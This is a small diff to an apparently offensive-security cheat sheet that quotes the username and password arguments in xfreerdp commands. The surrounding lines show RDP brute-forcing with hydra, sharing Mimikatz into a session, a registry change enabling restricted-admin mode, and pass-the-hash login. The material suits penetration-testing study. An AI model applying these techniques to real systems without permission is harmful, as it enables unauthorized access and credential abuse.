@@ -1590,7 +1590,7 @@ hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>
 Log in to the system via xFreeRDP
 
 ```bash
-xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD>
+xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>'
 ```
 
 </details>
@@ -2145,7 +2145,7 @@ We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administrat
 If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:
 
 ```bash
-xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /drive:share,/home/<USER>/mimikatz
+xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>' /drive:share,/home/<USER>/mimikatz
 ```
 
 > This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.
@@ -4124,7 +4124,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 Once the registry key is added, we can use *xfreerdp* with the option /pth to gain RDP access:
 
 ```bash
-xfreerdp  /v:<IP> /u:<USER> /pth:<HASH>
+xfreerdp  /v:<IP> /u:'<USER>' /pth:<HASH>
 ```
 
 </details>
